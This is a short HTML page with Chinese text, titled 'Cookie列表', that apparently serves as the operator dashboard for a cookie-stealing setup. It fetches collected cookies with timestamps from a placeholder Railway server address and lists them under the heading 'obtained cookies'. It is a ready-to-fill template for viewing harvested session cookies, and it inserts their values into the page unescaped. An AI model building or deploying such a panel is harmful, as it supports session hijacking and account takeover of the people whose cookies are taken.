<!DOCTYPE html>
<html lang="zh">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Cookie列表</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#111;color:#fff;font-family:Arial;padding:20px}
h2{color:#ff4900;margin-bottom:20px}
.cookie-item{background:#1a1a1a;padding:12px;margin-bottom:10px;border-radius:8px;border-left:3px solid #ff4900}
.cookie-item p{font-size:12px;color:#aaa;word-break:break-all;margin-top:5px}
.cookie-item .time{font-size:11px;color:#666}
.refresh{position:fixed;top:20px;right:20px;padding:8px 16px;background:#ff4900;color:#fff;border:none;border-radius:6px;font-size:14px;cursor:pointer}
</style>
</head>
<body>
<h2>已获取的Cookie</h2>
<button class="refresh" onclick="load()">刷新</button>
<div id="list">加载中...</div>

<script>
const API = "https://你的railway地址/api";

async function load() {
    const res = await fetch(API + "/cookies");
    const data = await res.json();
    
    document.getElementById("list").innerHTML = data.map(c =>
        `<div class="cookie-item">
            <span class="time">${c.time}</span>
            <p>${c.cookie}</p>
        </div>`
    ).join("") || "暂无数据";
}

load();
</script>
</body>
</html>
